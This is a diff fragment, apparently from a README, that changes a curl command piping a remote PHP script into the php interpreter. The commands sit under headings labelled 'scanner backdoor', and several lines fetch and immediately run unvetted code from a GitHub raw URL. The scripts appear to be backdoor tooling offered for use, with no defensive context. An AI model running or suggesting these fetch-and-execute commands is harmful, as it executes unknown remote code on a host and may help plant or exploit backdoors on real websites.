@@ -24,7 +24,7 @@ curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/grab
 ```
 # scanner backdoor high ☠️
 ```
-curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/outsca.php | php
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/outputkuta.php | php
 ```
 # Scanner backdoor simple ☠️
 ```
